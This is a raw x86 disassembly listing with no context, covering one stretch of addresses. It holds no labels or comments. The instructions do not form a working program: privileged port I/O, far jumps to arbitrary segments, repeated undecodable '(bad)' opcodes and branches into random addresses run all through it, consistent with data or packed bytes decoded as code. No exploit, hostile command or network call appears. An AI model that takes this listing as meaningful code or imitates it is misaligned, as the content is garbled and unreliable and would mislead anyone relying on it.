  411fb4:	adc    bh,BYTE PTR [edi-0x62ab7a9e]
  411fba:	jl     0x411f91
  411fbc:	out    0xed,eax
  411fbe:	jp     0x411fec
  411fc0:	int    0x3b
  411fc2:	fsub   QWORD PTR [esi-0x4e]
  411fc5:	enter  0x45f2,0xd3
  411fc9:	call   DWORD PTR [esi+0x7a]
  411fcc:	out    0x50,eax
  411fce:	ret    
  411fcf:	test   eax,0xf02b220
  411fd4:	and    BYTE PTR [eax+0x7e22b9d2],bh
  411fda:	imul   eax,DWORD PTR [ecx+ecx*2],0x9d76003b
  411fe1:	sbb    dh,BYTE PTR [eax+0x5ab2439e]
  411fe7:	das    
  411fe8:	imul   edx,edx,0xffffff89
  411feb:	or     DWORD PTR [edx-0x73],ebp
  411fee:	sbb    esi,DWORD PTR [edx+0x64]
  411ff1:	imul   edi,DWORD PTR ds:0x3cde127d,0x69f61dda
  411ffb:	mov    ebp,0x69b4ec1e
  412000:	push   edi
  412001:	add    BYTE PTR ds:0x5f9fa861,ch
  412007:	in     al,0x39
  412009:	bound  ebp,QWORD PTR [edi]
  41200b:	ja     0x411fc2
  41200d:	mov    eax,ds:0x2afe822e
  412012:	mov    ch,0xd4
  412014:	aaa    
  412015:	loope  0x411fde
  412017:	pop    edx
  412018:	push   0x7b6f69d1
  41201d:	inc    ebp
  41201e:	(bad)  
  41201f:	rcr    ebx,cl
  412021:	shl    ebp,1
  412023:	inc    edx
  412024:	out    0x92,eax
  412026:	adc    DWORD PTR [eax],ebp
  412028:	idiv   dh
  41202a:	neg    DWORD PTR [ebx]
  41202c:	mov    edx,0xff9e3e9a
  412031:	ss pushf 
  412033:	mov    ds:0xeacaa8cf,eax
  412038:	mov    ecx,0x9586d67c
  41203d:	push   esp
  41203e:	ror    DWORD PTR [edx-0x39],cl
  412041:	push   ebx
  412042:	pop    ss
  412043:	sahf   
  412044:	cmp    eax,0x1acb9855
  412049:	pop    eax
  41204a:	sbb    BYTE PTR [ecx],cl
  41204c:	and    al,0x24
  41204e:	ins    BYTE PTR es:[edi],dx
  41204f:	mov    edx,0x66a467fc
  412054:	ins    DWORD PTR es:[edi],dx
  412055:	outs   dx,BYTE PTR ds:[esi]
  412056:	xchg   edi,eax
  412057:	jmp    0x27b71ec6
  41205c:	dec    edi
  41205d:	xchg   esi,eax
  41205e:	lock mov cl,0xb8
  412061:	mov    al,0x61
  412063:	outs   dx,DWORD PTR ds:[esi]
  412064:	mov    esp,0x33c63f88
  412069:	or     al,0x1
  41206b:	call   0x5a42:0x8da37c31
  412072:	dec    ebx
  412073:	imul   ebp,DWORD PTR [ecx-0x103df0a7],0x41bc3812
  41207d:	stos   BYTE PTR es:[edi],al
  41207e:	sub    DWORD PTR [edi-0x44338c0d],edi
  412084:	ret    0xa38c
  412087:	and    ebp,DWORD PTR [ebx]
  412089:	(bad)  
  41208a:	sahf   
  41208b:	add    edx,DWORD PTR [edi+0x4a]
  41208e:	(bad)  
  41208f:	jmp    0x1c0bf65a
  412094:	push   ds
  412095:	out    dx,eax
  412096:	dec    ecx
  412097:	cmp    DWORD PTR [ecx],edx
  412099:	inc    eax
  41209a:	(bad)  [esi-0x43]
  41209d:	vpsubsb xmm4,xmm7,XMMWORD PTR [ebp-0x3a]
  4120a2:	pop    ds
  4120a3:	popa   
  4120a4:	(bad)
  4120a7:	loope  0x412117
  4120a9:	xor    esi,DWORD PTR [ecx]
  4120ab:	xor    al,0x3
  4120ad:	xchg   esi,eax
  4120ae:	sti    
  4120af:	mov    ds:0x7af5726f,al
  4120b4:	cwde   
  4120b5:	cmp    al,0x31
  4120b7:	cmp    al,0xd4
  4120b9:	dec    ecx
  4120ba:	std    
  4120bb:	fisubr DWORD PTR [edx+0x5b5f8a21]
  4120c1:	ja     0x4120f3
  4120c3:	adc    dh,bh
  4120c5:	retf   
  4120c6:	xchg   ecx,eax
  4120c7:	gs push ds
  4120c9:	arpl   di,ax
  4120cb:	cmp    eax,0xb8b92d51
  4120d0:	and    BYTE PTR [edi-0x558b8a88],al
  4120d6:	arpl   si,bp
  4120d8:	dec    edi
  4120d9:	push   esp
  4120da:	pop    edi
  4120db:	in     al,0xb3
  4120dd:	shr    DWORD PTR [edx+0x72],1
  4120e0:	aad    0x5f
  4120e2:	sub    al,0x65
  4120e4:	(bad)  
  4120e5:	or     eax,0xeafdcd42
  4120ea:	adc    al,0xd8
  4120ec:	enter  0xdf3a,0x60
  4120f0:	xchg   edi,eax
  4120f1:	inc    ebx
  4120f2:	xchg   ebx,eax
  4120f3:	add    esi,ecx
  4120f5:	stc    
  4120f6:	icebp  
  4120f7:	in     eax,0xb
  4120f9:	mov    dh,0x32
  4120fb:	cmc    
  4120fc:	shr    DWORD PTR [edx],0x16
  4120ff:	mov    ds:0x3dcc3ad3,al
  412104:	sahf   
  412105:	pop    ecx
  412106:	in     eax,dx
  412107:	push   esp
  412108:	clc    
  412109:	ja     0x41210a
  41210b:	jmp    0x4120b0
  41210d:	pusha  
  41210e:	mov    ss,WORD PTR [edi+ebp*8]
  412111:	icebp  
  412112:	sub    BYTE PTR [eax-0x523449fc],al
  412118:	out    dx,al
  412119:	lods   al,BYTE PTR ds:[esi]
  41211a:	or     al,0x54
  41211c:	aaa    
  41211d:	outs   dx,DWORD PTR ds:[esi]
  41211e:	hlt    
  41211f:	leave  
  412120:	sub    ecx,DWORD PTR [edx+0x1c]
  412123:	jne    0x41216d
  412125:	mov    esi,0xe184e5a0
  41212a:	out    dx,al
  41212b:	and    ch,ah
  41212d:	iret   
  41212e:	callw  0x129f
  412132:	cmp    DWORD PTR [esi+0x4a],esi
  412135:	pop    edx
  412136:	add    DWORD PTR [edx+0x4519bad9],esi
  41213c:	mov    ch,0x92
  41213e:	(bad)  
  41213f:	dec    edi
  412140:	fucom  st(1)
  412142:	out    dx,eax
  412143:	popf   
  412144:	fcom   QWORD PTR [eax+0x4c1c74b1]
  41214a:	mov    esp,0xceb77c4d
  41214f:	sub    cl,BYTE PTR [ecx+0x29]
  412152:	pop    edx
  412153:	jns    0x4121cf
  412155:	not    BYTE PTR [esi+0x1d10624b]
  41215b:	xchg   ebp,eax
  41215c:	mov    al,ds:0x900fd6db
  412161:	sbb    DWORD PTR [ecx+0x4f73ed2c],edi
  412167:	loope  0x41218b
  412169:	aad    0x1d
  41216b:	adc    ebp,DWORD PTR [ecx]
  41216d:	push   0x4e3bb819
  412172:	ficomp WORD PTR [eax+0x4d]
  412175:	stos   BYTE PTR es:[edi],al
  412176:	jp     0x412185
  412178:	push   esp
  412179:	add    dl,dl
  41217b:	xchg   edi,eax
  41217c:	xchg   DWORD PTR [edx],ebx
  41217e:	fadd   QWORD PTR [ecx]
  412180:	aaa    
  412181:	cmp    dl,BYTE PTR [edx]
  412183:	adc    al,BYTE PTR [ebp+0x63]
  412186:	mov    dh,0xf7
  412188:	pop    ebp
  412189:	pop    es
  41218a:	inc    ebx
  41218b:	test   DWORD PTR [eax],esi
  41218d:	loope  0x412143
  41218f:	sub    cl,cl
  412191:	aam    0x3f
  412193:	pusha  
  412194:	icebp  
  412195:	arpl   WORD PTR ds:0x536db935,bp
  41219b:	mov    cl,0xcb
  41219d:	mov    BYTE PTR [esi],ch
  41219f:	test   BYTE PTR [ebx+0x46],al
  4121a2:	cdq    
  4121a3:	add    eax,0x83d28e06
  4121a8:	out    0xe0,eax
  4121aa:	aaa    
  4121ab:	loopne 0x4121d0
  4121ad:	leave  
  4121ae:	xchg   ebx,eax
  4121af:	pop    edx
  4121b0:	pop    ecx
  4121b1:	rol    BYTE PTR [esi-0x28],0x14
  4121b5:	fcomp  DWORD PTR [esi]
  4121b7:	outs   dx,DWORD PTR ds:[esi]
  4121b8:	pop    edx
  4121b9:	sti    
  4121ba:	outs   dx,BYTE PTR ds:[esi]
  4121bb:	push   esi
  4121bc:	jo     0x41216d
  4121be:	mov    ds:0xcbc3774b,al
  4121c3:	leave  
  4121c4:	out    0x76,al
  4121c6:	or     DWORD PTR [ecx-0x4e92f667],esi
  4121cc:	or     eax,0xde276abc
  4121d1:	aad    0xe4
  4121d3:	jle    0x412168
  4121d5:	in     eax,dx
  4121d6:	cli    
  4121d7:	push   edi
  4121d8:	and    ecx,0xdf56e496
  4121de:	aas    
  4121df:	inc    ebx
  4121e0:	(bad)  
  4121e1:	push   esi
  4121e2:	scas   eax,DWORD PTR es:[edi]
  4121e3:	data16 jle 0x41222b
  4121e6:	adc    DWORD PTR [esi],ecx
  4121e8:	pop    ecx
  4121e9:	cs push cs
  4121eb:	jle    0x412185
  4121ed:	out    0xc6,eax
  4121ef:	test   DWORD PTR [edi+0x48dc2af3],esp
  4121f5:	mov    ds:0xa746f85f,al
  4121fa:	push   cs
  4121fb:	mov    ds:0xfc08e65a,al
  412200:	inc    esp
  412201:	pop    ebx
  412202:	cld    
  412203:	mov    esp,0x83965b19
  412208:	cdq    
  412209:	jg     0x4121cf
  41220b:	add    ecx,DWORD PTR [edi-0x182d8ec7]
  412211:	es pop ss
  412213:	fwait
  412214:	mov    cl,0xb3
  412216:	jl     0x412286
  412218:	(bad)  
  412219:	jo     0x41222e
  41221b:	pusha  
  41221c:	push   es
  41221d:	xor    al,0x6c
  41221f:	cli    
  412220:	and    BYTE PTR [eax-0x33],bh
  412223:	cmp    bl,dh
  412225:	push   ecx
  412226:	fmul   st,st(3)
  412228:	sar    BYTE PTR [ebx],0x45
  41222b:	jbe    0x4121fb
  41222d:	outs   dx,DWORD PTR ds:[esi]
  41222e:	xor    BYTE PTR [ecx],0x3e
  412231:	jnp    0x4122ab
  412233:	mov    esp,0x178f2687
  412238:	xlat   BYTE PTR ds:[ebx]
  412239:	inc    edi
  41223a:	dec    esp
  41223b:	add    al,0xc9
  41223d:	lea    ecx,[ecx]
  41223f:	iret   
  412240:	add    DWORD PTR [ebx+ebp*1+0x6ccaff24],ebx
  412247:	jl     0x41226c
  412249:	push   eax
  41224a:	adc    al,0xc1
  41224c:	stc    
  41224d:	jbe    0x41220a
  41224f:	mov    dl,BYTE PTR [edx+0x2137c8ea]
  412255:	pushf  
  412256:	inc    esi
  412257:	and    al,0x18
  412259:	loopne 0x41229c
  41225b:	call   DWORD PTR [ecx+0x49]
  41225e:	outs   dx,DWORD PTR ds:[esi]
  41225f:	je     0x41228c
  412261:	dec    ebp
  412262:	ja     0x4122da
  412264:	push   ebx
  412265:	inc    ebp
  412266:	add    BYTE PTR [esi+ebp*8],cl
  412269:	mov    DWORD PTR [ebp-0x5c40754f],0x2b1324a1
  412273:	inc    edx
  412274:	imul   ebp,edx,0x6c4ad45f
  41227a:	icebp  
  41227b:	(bad)  
  41227c:	adc    DWORD PTR [esi-0x1dfdd4ed],esp
  412282:	mov    ecx,0x674b37a
  412287:	retf   
  412288:	pop    edx
  412289:	sahf   
  41228a:	mov    edx,0xd92b8a0f
  41228f:	jne    0x412232
  412291:	cli    
  412292:	mov    bh,0x39
  412294:	outs   dx,DWORD PTR ds:[esi]
  412295:	xchg   ebx,eax
  412296:	dec    ecx
  412297:	gs leave 
  412299:	addr16 mov eax,fs:0x8634
  41229e:	fidivr DWORD PTR [ebp+0x59]
  4122a1:	dec    BYTE PTR [edi+eiz*2]
  4122a4:	jmp    0x5683:0xdf6305df
  4122ab:	mov    eax,DWORD PTR [esp+ecx*8]
  4122ae:	inc    ecx
  4122af:	dec    ebx
  4122b0:	or     al,0x5a
  4122b2:	mov    ah,0xbc
  4122b4:	xchg   ebp,eax
  4122b5:	mov    al,ds:0xc7b36eae
  4122ba:	dec    ebp
  4122bb:	sahf   
  4122bc:	push   ecx
  4122bd:	(bad)  
  4122be:	fdivr  QWORD PTR [ebx]
  4122c0:	dec    esi
  4122c1:	stos   DWORD PTR es:[edi],eax
  4122c2:	iret   
  4122c3:	fwait
  4122c4:	outs   dx,BYTE PTR ds:[esi]
  4122c5:	inc    ebp
  4122c6:	or     ecx,DWORD PTR [ecx-0x4a]
  4122c9:	je     0x412334
  4122cb:	adc    edx,DWORD PTR [ecx+0x64b4bb28]
  4122d1:	jg     0x412279
  4122d3:	clc    
  4122d4:	push   ecx
  4122d5:	mov    cl,0x8b
  4122d7:	xchg   ecx,eax
  4122d8:	call   FWORD PTR [edi+0x647bdff0]
  4122de:	retf   
  4122df:	loopne 0x4122ac
  4122e1:	std    
  4122e2:	cmp    eax,0x2ac1c9b2
  4122e7:	adc    bh,dh
  4122e9:	ficom  DWORD PTR [ebx]
  4122eb:	lods   al,BYTE PTR ds:[esi]
  4122ec:	push   ds
  4122ed:	stos   DWORD PTR es:[edi],eax
  4122ee:	mov    dh,0xb
  4122f0:	cmc    
  4122f1:	popa   
  4122f2:	cwde   
  4122f3:	inc    ebx
  4122f4:	js     0x412289
  4122f6:	dec    ecx
  4122f7:	mov    cl,0xf7
  4122f9:	rcr    DWORD PTR [ecx],cl
  4122fb:	xor    eax,0xe8649791
  412300:	push   0xffffff92
  412302:	mov    al,0xdd
  412304:	test   eax,0x9b689af0
  412309:	push   ebp
  41230a:	dec    esi
  41230b:	mov    DWORD PTR [ecx-0x3c5a53cb],esi
  412311:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  412312:	xchg   DWORD PTR [edi],ebx
  412314:	ds adc al,0xe
  412317:	mov    edi,0x7d6acd45
  41231c:	cdq    
  41231d:	(bad)  
  41231f:	jmp    0x412355
  412321:	loope  0x41239f
  412323:	icebp  
  412324:	fisubr WORD PTR ds:0xbd487646
  41232a:	cmp    BYTE PTR [ebx+eax*2-0x499f39ce],dh
  412331:	(bad)  [edx]
  412333:	aas    
  412334:	ficom  WORD PTR [edx-0xe]
  412337:	xor    eax,0x20259aac
  41233c:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41233d:	cs in  al,dx
  41233f:	ror    bl,0x55
  412342:	rol    bl,1
  412344:	push   ebx
  412345:	inc    ecx
  412346:	mov    ebx,0x35685da
  41234b:	cwde   
  41234c:	xchg   DWORD PTR [esi],ecx
  41234e:	arpl   WORD PTR [eax],ax
  412350:	sub    DWORD PTR [ebx+0x57dd29d0],eax
  412356:	inc    edx
  412357:	loope  0x412396
  412359:	pusha  
  41235a:	push   0xe5d05b9e
  41235f:	into   
  412360:	jno    0x412332
  412362:	inc    ebp
  412363:	pop    ds
  412364:	or     edi,esi
  412366:	call   0x2548:0xfc8d334f
  41236d:	loope  0x4123ac
  41236f:	jbe    0x412354
  412371:	arpl   WORD PTR [ebx],bx
  412373:	imul   edi,DWORD PTR [ecx],0x55
  412376:	sbb    BYTE PTR [ebx],0xf8
  412379:	pop    esi
  41237a:	in     eax,dx
  41237b:	jmp    0x2c064ba1
  412380:	add    edi,DWORD PTR [edi+0x22]
  412383:	push   cs
  412384:	jecxz  0x4123a7
  412386:	(bad)  
  412388:	mov    ch,0xf7
  41238a:	lahf   
  41238b:	fidivr WORD PTR [edx+edi*1+0x34]
  41238f:	int    0xfd
  412391:	xchg   esi,eax
  412392:	mov    WORD PTR [eax],fs
  412394:	mov    dh,0x45
  412396:	daa    
  412397:	dec    ecx
  412398:	mov    bh,0xbd
  41239a:	loop   0x4123ea
  41239c:	fistp  QWORD PTR [eax-0x1db9abb3]
  4123a2:	aaa    
  4123a3:	xor    eax,0xc1bb01fa
  4123a8:	mov    eax,ds:0x8e1fc00c
  4123ad:	jmp    0xe05f:0xec11d3a
  4123b4:	ret    
  4123b5:	aas    
  4123b6:	jg     0x4123fb
  4123b8:	inc    esi
  4123b9:	iret   
  4123ba:	ja     0x41239e
  4123bc:	dec    esi
  4123bd:	xor    al,0x46
  4123bf:	pop    ss
  4123c0:	ucomiss xmm6,DWORD PTR [esp+ebx*1+0x70]
  4123c5:	mov    eax,ds:0x9d2a6d2b
  4123ca:	push   esi
  4123cb:	xchg   BYTE PTR [ecx-0x6d],ch
  4123ce:	pushf  
  4123cf:	imul   ebx,ecx,0x6413cb0e
  4123d5:	push   eax
  4123d6:	sti    
  4123d7:	lods   eax,DWORD PTR ds:[esi]
  4123d8:	out    dx,al
  4123d9:	icebp  
  4123da:	sub    eax,DWORD PTR [eax-0x5b]
  4123dd:	sub    eax,esi
  4123df:	jo     0x412415
  4123e1:	mov    dl,0x6
  4123e3:	pop    ebp
  4123e4:	push   eax
  4123e5:	add    DWORD PTR [ecx],0xf573d49e
  4123eb:	int3   
  4123ec:	sbb    ebp,edx
  4123ee:	inc    ebx
  4123ef:	call   0xa910:0x2d28dbf5
  4123f6:	rol    DWORD PTR [edi],cl
  4123f8:	add    eax,0x5293f3e0
  4123fd:	add    ch,BYTE PTR [eax+0x63]
  412400:	add    al,0x65
  412402:	adc    bh,BYTE PTR [ecx-0x7b]
  412405:	leave  
  412406:	test   eax,0xe2e04779
  41240b:	ja     0x4123db
  41240d:	sub    eax,0xeae6e358
  412412:	ret    
  412413:	imul   edi,DWORD PTR [eax+0x62],0x1d
  412417:	stos   DWORD PTR es:[edi],eax
  412418:	mov    al,ds:0xf7f2ab8a
  41241d:	scas   al,BYTE PTR es:[edi]
  41241e:	into   
  41241f:	pop    edi
  412420:	out    0xb8,eax
  412422:	jecxz  0x412444
  412424:	je     0x4123ea
  412426:	shl    DWORD PTR fs:[edi+ebp*4],cl
  41242a:	dec    esi
  41242b:	mov    dh,0x1f
  41242d:	imul   ecx,DWORD PTR [esi+0x5e],0xa996b360
  412434:	(bad)  
  412435:	jle    0x41240b
  412437:	nop
  412438:	sti    
  412439:	sub    eax,0x2daf15ea
  41243e:	jnp    0x4124a3
  412440:	xchg   esp,eax
  412441:	adc    al,0x80
  412443:	sbb    al,0x15
  412445:	dec    ebp
  412446:	lods   al,BYTE PTR ds:[esi]
  412447:	das    
  412448:	push   ecx
  412449:	jb     0x412414
  41244b:	xlat   BYTE PTR ds:[ebx]
  41244c:	sub    cl,BYTE PTR [eax]
  41244e:	(bad)  
  41244f:	not    BYTE PTR ss:[ebx]
  412452:	fcomp  DWORD PTR [esi-0x36]
  412455:	je     0x412440
  412457:	jl     0x412452
  412459:	adc    bl,dh
  41245b:	xchg   ebx,eax
  41245c:	inc    edx
  41245d:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41245e:	cmp    eax,0x9faff7c4
  412463:	cmp    al,0x33
  412465:	mov    ecx,0xba08ea4d
  41246a:	inc    ecx
  41246b:	aam    0xc3
  41246d:	sub    ebp,ecx
  41246f:	fisub  WORD PTR [ebp-0x65]
  412472:	and    al,0xae
  412474:	imul   esp,DWORD PTR [edx+0x10],0xffffff90
  412478:	arpl   WORD PTR [ebp-0x70ccd94a],bp
  41247e:	xchg   ebx,eax
  41247f:	add    edi,ebx
  412481:	mov    edx,0xdd30c9f
  412486:	cmp    eax,0xe4c8506f
  41248b:	or     eax,0x7017008b
  412490:	pop    ecx
  412491:	out    dx,eax
  412492:	pop    ds
  412493:	and    al,0xad
  412495:	and    al,ch
  412497:	dec    eax
  412498:	out    dx,al
  412499:	sub    al,0x5d
  41249b:	jnp    0x412469
  41249d:	js     0x412510
  41249f:	and    eax,0x2ac072f5
  4124a4:	(bad)
  4124a8:	jmp    0x41243a
  4124aa:	shr    DWORD PTR [eax],0xbb
  4124ad:	sub    ecx,edi
  4124af:	repnz xor dl,cl
  4124b2:	loop   0x4124df
  4124b4:	dec    esp
  4124b5:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4124b6:	das    
  4124b7:	cld    
  4124b8:	xlat   BYTE PTR ds:[ebx]
  4124b9:	pushf  
  4124ba:	inc    edx
  4124bb:	or     BYTE PTR [esp],al
  4124be:	arpl   WORD PTR [edx+0x2c59f6eb],bx
  4124c4:	and    al,0xa4
  4124c6:	dec    ecx
  4124c7:	sbb    al,0xe4
  4124c9:	int3   
  4124ca:	jl     0x4124f4
  4124cc:	xor    dh,ah
  4124ce:	add    al,BYTE PTR [eax]
  4124d0:	pop    ss
  4124d1:	fucom  st(7)
  4124d3:	(bad)  
  4124d4:	popf   
  4124d5:	mov    bh,BYTE PTR [esi-0x7b247b0d]
  4124db:	jl     0x41245e
  4124dd:	out    0x32,al
  4124df:	push   edx
  4124e0:	inc    esp
  4124e1:	mov    ds:0x8484b60c,eax
  4124e6:	mov    edx,0xb12ab924
  4124eb:	sbb    BYTE PTR [ebp+edx*2+0x77],dh
  4124ef:	in     eax,0x5c
  4124f1:	push   ebp
  4124f2:	imul   edx,DWORD PTR [ebx+0x1d70135b],0x4175f76e
  4124fc:	mov    ah,0xc3
  4124fe:	jge    0x412498
  412500:	xor    ecx,eax
  412502:	or     bl,dh
  412504:	cld    
  412505:	inc    esi
  412506:	imul   eax,DWORD PTR [edi-0x47],0x5d
  41250a:	shr    bl,1
  41250c:	icebp  
  41250d:	loopne 0x412534
  41250f:	mov    al,ds:0x4315de81
  412514:	mov    bl,0xb0
  412516:	dec    BYTE PTR [ebx+eiz*4]
  412519:	add    BYTE PTR [ebp+ecx*4-0x3a],bh
  41251d:	pop    es
  41251e:	fimul  DWORD PTR [ebp+0x74]
  412521:	pop    esi
  412522:	cld    
  412523:	int    0x44
  412525:	ins    BYTE PTR es:[edi],dx
  412526:	ja     0x4124e6
  412528:	(bad)  
  41252a:	xor    BYTE PTR [edi+ebx*4],cl
  41252d:	pop    edx
  41252e:	inc    edx
  41252f:	lods   al,BYTE PTR ds:[esi]
  412530:	jns    0x412592
  412532:	lahf   
  412533:	out    dx,al
  412534:	rcl    BYTE PTR [ecx-0x674f872d],0x44
  41253b:	sbb    al,0x2b
  41253d:	pop    ss
  41253e:	ror    BYTE PTR [esi+0x19],cl
  412541:	sub    esi,eax
  412543:	sbb    eax,0xe2e63d1f
  412548:	add    esp,DWORD PTR [eax+ecx*4-0x2e]
  41254c:	(bad)  
  41254d:	mov    esi,0x5f37ae29
  412552:	ins    DWORD PTR es:[edi],dx
  412553:	jae    0x412588
  412555:	sub    eax,0xb26b931a
  41255a:	cwde   
  41255b:	js     0x412537
  41255d:	lds    esi,FWORD PTR [ebx+0xe450717]
  412563:	or     dl,BYTE PTR [esp+edx*2-0x1b921cfe]
  41256a:	arpl   bx,bx
  41256c:	cmp    eax,0xe37e42bf
  412571:	xor    al,0xd3
  412573:	aaa    
  412574:	add    cl,bl
  412576:	mov    DWORD PTR [ecx+0x23],ebx
  412579:	push   es
  41257a:	out    0xb0,eax
  41257c:	daa    
  41257d:	arpl   dx,dx
  41257f:	dec    esi
  412580:	mov    ebx,0xe9281802
  412585:	data16 jo 0x4125b9
  412588:	sar    cl,0xfe
  41258b:	shr    DWORD PTR [ebx+0x69441152],cl
  412591:	icebp  
  412592:	sbb    ebp,DWORD PTR [edx]
  412594:	add    ecx,DWORD PTR [ebx]
  412596:	sub    eax,0xf403bbe1
  41259b:	jmp    0x412578
  41259d:	pop    eax
  41259e:	sbb    bl,0xd0
  4125a1:	add    ebp,ebx
  4125a3:	mov    esi,0x4a5f201f
  4125a8:	jb     0x412530
  4125aa:	push   edi
  4125ab:	in     eax,dx
  4125ac:	xlat   BYTE PTR ds:[ebx]
  4125ad:	inc    esi
  4125ae:	and    DWORD PTR [edx+0x79],edi
  4125b1:	mov    BYTE PTR [edi-0x6a],ah
  4125b4:	js     0x412547
  4125b6:	adc    BYTE PTR [edi+0x3a],bl
  4125b9:	mov    edi,0x62ad884f
  4125be:	push   esi
  4125bf:	push   esi
  4125c0:	fbld   TBYTE PTR [ebp+0x79]
  4125c3:	cmp    DWORD PTR [esi],0xe236c5b7
  4125c9:	ror    DWORD PTR [esi+0x1b28a170],cl
  4125cf:	push   ebx
  4125d0:	aas    
  4125d1:	or     al,0xb2
  4125d3:	loopne 0x4125b3
  4125d5:	pusha  
  4125d6:	sub    eax,0xdfc3c894
  4125db:	sub    esp,eax
  4125dd:	xchg   esp,eax
  4125de:	fcomp  st(1)
  4125e0:	not    DWORD PTR [edx+0x1985094a]
  4125e6:	ins    DWORD PTR es:[edi],dx
  4125e7:	dec    esi
  4125e8:	mov    edi,0x168c220d
  4125ed:	(bad)  
  4125ee:	loop   0x4125b5
  4125f0:	mov    dh,BYTE PTR [eax]
  4125f2:	mov    bh,0x3f
  4125f4:	adc    eax,0x241c18e0
  4125f9:	data16 mov bl,0x1
  4125fc:	add    BYTE PTR [esi],bl
  4125fe:	retf   
  4125ff:	inc    ebp
  412600:	push   edi
  412601:	sbb    edi,edx
  412603:	jp     0x41265f
  412605:	sbb    dl,bh
  412607:	out    dx,eax
  412608:	shl    DWORD PTR [esi+0x53],0x45
  41260c:	fucom  st(0)
  41260e:	or     eax,0x7f942e04
  412613:	inc    esp
  412614:	imul   esp,DWORD PTR [ebx-0x63a75a62],0xef27fe4c
  41261e:	les    esp,FWORD PTR [esi]
  412620:	ins    BYTE PTR es:[edi],dx
  412621:	stos   BYTE PTR es:[edi],al
  412622:	xor    eax,0x1d9a181c
  412627:	xchg   ecx,eax
  412628:	xchg   edx,eax
  412629:	dec    esi
  41262a:	jge    0x4125b3
  41262c:	mov    al,0x4e
  41262e:	mov    cl,0xc8
  412630:	pop    esi
  412631:	add    ecx,DWORD PTR [ebp-0x2a]
  412634:	xor    eax,0xfa52f3f5
  412639:	mov    esp,DWORD PTR [eax-0x78395996]
  41263f:	mov    esp,0x2f2d6feb
  412644:	xor    DWORD PTR [ebp+0x3a],eax
  412647:	xchg   edx,eax
  412648:	push   0xd0c48196
  41264d:	mov    ds:0xd61e96e8,al
  412652:	cmp    al,0x59
  412654:	push   edi
  412655:	fwait
  412656:	xor    al,al
  412658:	sar    DWORD PTR [ecx+0x5197fc1a],0x5d
  41265f:	jg     0x412682
  412661:	cmp    al,0xbe
  412663:	dec    ecx
  412664:	sar    ch,0xbf
  412667:	inc    eax
  412668:	push   ss
  412669:	aam    0x58
  41266b:	inc    esi
  41266c:	xor    dh,BYTE PTR [ecx]
  41266e:	dec    ebp
  41266f:	ret    0xbc48
  412672:	xchg   ebp,eax
  412673:	inc    edi
  412674:	out    dx,eax
  412675:	aam    0x7f
  412677:	xchg   esp,eax
  412678:	hlt    
  412679:	jmp    0xc3b70d2f
  41267e:	in     eax,dx
  41267f:	clc    
  412680:	push   ds
  412681:	pop    edi
  412682:	clc    
  412683:	mov    edx,0x34c96e61
  412688:	out    dx,eax
  412689:	mov    edi,0x52aa4ea7
  41268e:	push   ss
  41268f:	xchg   DWORD PTR [edi],eax
  412691:	(bad)  [edx+0x25e3ffb5]
  412697:	fsub   st,st(7)
  412699:	rcr    BYTE PTR [esi],0xb4
  41269c:	mov    fs,WORD PTR [ebx]
  41269e:	inc    ebp
  41269f:	test   DWORD PTR [ebx+0x6d],eax
  4126a2:	es daa 
  4126a4:	imul   ebp,DWORD PTR [ebx+edi*8+0x0],0xffffffbd
  4126a9:	xchg   esp,eax
  4126aa:	std    
  4126ab:	mov    DWORD PTR [edx],esp
  4126ad:	adc    ebx,DWORD PTR [ebx+ecx*4]
  4126b0:	cs addr16 jnp 0x412733
  4126b4:	and    eax,0xb5f0a40c
  4126b9:	sbb    edi,DWORD PTR [ecx+ecx*8]
  4126bc:	ins    DWORD PTR es:[edi],dx
  4126bd:	stos   BYTE PTR es:[edi],al
  4126be:	sbb    BYTE PTR [edi],bl
  4126c0:	jnp    0x4126fb
  4126c2:	or     bh,bl
  4126c4:	jmp    DWORD PTR [edx]
  4126c6:	dec    ebx
  4126c7:	into   
  4126c8:	mov    ebp,0xe2e1c3fe
  4126cd:	cdq    
  4126ce:	stos   BYTE PTR es:[edi],al
  4126cf:	jmp    0x41269b
  4126d1:	jg     0x41267d
  4126d3:	in     eax,0x7d
  4126d5:	cmc    
  4126d6:	(bad)  
  4126d7:	add    ah,BYTE PTR [ecx]
  4126d9:	fcom   DWORD PTR [edx]
  4126db:	ficomp WORD PTR [edi+0x78d538b9]
  4126e1:	push   ecx
  4126e2:	sub    eax,0xf314b87f
  4126e7:	test   al,0xe4
  4126e9:	cmp    BYTE PTR [edx-0x72],bh
  4126ec:	je     0x412749
  4126ee:	mov    cl,0x98
  4126f0:	test   DWORD PTR [ebx],ebp
  4126f2:	lea    edi,[edi+0x60af2f69]
  4126f8:	imul   esi,esp,0x7000d4a4
  4126fe:	xor    edx,edx
  412700:	cs jbe 0x4126a2
  412703:	sbb    bl,BYTE PTR [eax+eax*1]
  412706:	and    eax,0x1ecee1d6
  41270b:	hlt    
  41270c:	sub    DWORD PTR gs:[eax+0x1e],0xffffff83
  412711:	xchg   BYTE PTR [esi+0x786ae659],al
  412717:	jnp    0x41276c
  412719:	push   ecx
  41271a:	call   0x2b555f2f
  41271f:	outs   dx,DWORD PTR ds:[esi]
  412720:	retf   
  412721:	mov    WORD PTR [esi-0x2d91dcb2],fs
  412727:	sbb    ebp,esi
  412729:	repz arpl di,sp
  41272c:	test   al,0xb8
  41272e:	ins    DWORD PTR es:[edi],dx
  41272f:	cdq    
  412730:	add    BYTE PTR [esi-0x22],dh
  412733:	jmp    0x4126ed
  412735:	jecxz  0x412745
  412737:	clc    
  412738:	pop    ds
  412739:	outs   dx,DWORD PTR ds:[esi]
  41273a:	push   ebx
  41273b:	jnp    0x4126ca
  41273d:	sbb    dl,0xc5
  412740:	leave  
  412741:	mov    ebp,0xdaf87fd3
  412746:	test   al,0x8b
  412749:	xlat   BYTE PTR ds:[ebx]
  41274a:	cmp    eax,0xd7b94574
  41274f:	push   ebx
  412750:	sub    DWORD PTR ds:0x67a1fb3b,ecx
  412756:	adc    ah,al
  412758:	adc    eax,0x1aea9e60
  41275d:	push   esp
  41275e:	stos   BYTE PTR es:[edi],al
  41275f:	cdq    
  412760:	mov    ds,WORD PTR [ebp+edi*2+0x24a89c8e]
  412767:	sti    
  412768:	imul   ecx,DWORD PTR [eax],0x6be4b4d7
  41276e:	xor    eax,DWORD PTR [ebx]
  412770:	dec    esi
  412771:	rcr    edi,cl
  412773:	jne    0x412756
